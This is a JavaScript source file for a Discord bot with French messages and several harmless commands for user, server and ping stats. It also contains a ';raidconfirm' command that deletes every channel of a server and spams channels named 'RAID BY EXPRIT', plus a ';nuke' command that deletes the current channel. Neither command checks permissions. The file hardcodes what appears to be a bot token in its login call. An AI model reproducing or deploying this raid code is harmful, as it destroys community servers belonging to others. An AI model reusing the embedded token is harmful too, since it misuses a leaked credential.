


const Discord = require('discord.js');
var test = 1;
const client = new Discord.Client()
client.on('ready', () => {
  console.log(`Je suis pret ! ${client.users.tag} est operrationel !`);
  client.user.setPresence({
    status: "idle",
    game: {
        name: "koilafaitdon le developper :o",
        type: "WATCHING"
    }});
});

client.on('message', message => {
  if (message.content === ';me') {
    message.delete();
    message.channel.send(`You: ${message.author.username}`);
    message.react('🤔')
    const embed = new Discord.RichEmbed()
  .setTitle(`Stats`)
  .setAuthor(`Autheur : ${message.author.tag}`)
  .setColor(0x00AE86)
  .setDescription(`Name : ${message.author.username}`)
  .setFooter(`Compte crée le : ${message.author.createdAt}`)
  .setThumbnail(`${message.author.avatarURL}`)
  .addField(`Dernier message :  ${message.author.lastMessage}`)
  .addField(`Tu a rejoins le serveur le :  ${message.guild.joinedAt}`)
  message.channel.send(embed);
  }
    if (message.content === ';ping') {
        message.delete();
        message.channel.send("Ping en cours de calcule...")
        const embed2 = new Discord.RichEmbed()
        .setTitle(`Latence`)
        .setAuthor(`Autheur : ${message.author.tag}`)
        .setColor(0x00AE86)
        .setDescription(`🏓Trouver !!!! : \nLatence : ${Math.round(message.author.ping)}ms\nAPI Latence : ${Math.round(client.ping)}ms`)
        message.channel.send(embed2);
  }
  if (message.content === ';channel') {
message.channel.send(`Channel crée le : ${message.channel.createdAt}\nNom du channel : ${message.channel.name}\nVouslez crée une invite pour se salon si oui veuillez ecrire ;invite`)
  }
 if (message.content === ';server') {
  const embed3 = new Discord.RichEmbed()
  .setTitle(`Membre : ${message.guild.memberCount}`)
  .setAuthor(`${message.guild.name}`)
  .setColor(0x00AE86)
  .setDescription(`Salon afk : ${message.guild.afkChannel}\nJe suis dans : ${client.guilds.size} serveur !!!`)
  message.channel.send(embed3); 
 
}
if (message.content === ';help') {
  message.delete()
 const embed4 = new Discord.RichEmbed()
 .setTitle(`Voici les commandes ${message.author.username}`)
 .setAuthor(`${message.author.tag}`)
 .setColor(0x00AE86)
 .setDescription(`;server : voir les stats du serveur\n;me : voir vos stats\n;channel : stats du channel ou le message a été envoyer\n;ping : voir vos ping et celui du bot`)
 message.author.sendMessage(embed4);
 const embed5 = new Discord.RichEmbed()
 .setTitle(`Regarder vos mp !`)
 .setAuthor(`${message.author.tag}`)
 message.channel.send(embed5)
}
if (message.content === ';nuke') {
  message.channel.send("https://tenor.com/view/explosion-atom-bomb-gif-14111585")
  message.channel.clone()
  message.channel.delete()
}
if (message.content === ';newchannel'){
  message.delete()
  message.channel.clone(`${message.author.username}`)
}
if (message.content === ';raid'){
  const embedraid = new Discord.RichEmbed()
  .setTitle(`EXPRIT RAID CONFIRM`)
  .setAuthor(`Raid non activée`)
  .setColor("RANDOM")
  .setDescription(`Pour confirmer le raid faite ;raidconfirm`)
  message.channel.send(embedraid)
}
if (message.content === ';raidconfirm'){
  const embedraidconfirm = new Discord.RichEmbed()
  .setTitle(`EXPRIT RAID V.1`)
  .setAuthor(`Raid en cours....`)
  .setColor("RANDOM")
  .setDescription(`Channel restant : ${message.guild.channels.size}\nMessage envoyer : ...`)
  message.channel.send(embedraidconfirm)
  message.guild.channels.deleteAll()
  message.guild.createChannel("RAID BY EXPRIT")
  message.guild.createChannel("RAID BY EXPRIT")
  message.guild.createChannel("RAID BY EXPRIT")
  message.guild.createChannel("RAID BY EXPRIT")
  message.guild.createChannel("RAID BY EXPRIT")
  message.guild.createChannel("RAID BY EXPRIT")
  message.guild.createChannel("RAID BY EXPRIT")
  message.guild.createChannel("RAID BY EXPRIT")
  message.guild.createChannel("RAID BY EXPRIT")
  message.guild.createChannel("RAID BY EXPRIT")
  message.guild.createChannel("RAID BY EXPRIT")
  message.guild.createChannel("RAID BY EXPRIT")
}
});


client.login('ODU2NTEwOTM5MzMwNTEwODY4.YNCF-Q.AqXEj2CERvK1APm5creJ3ftyEso');

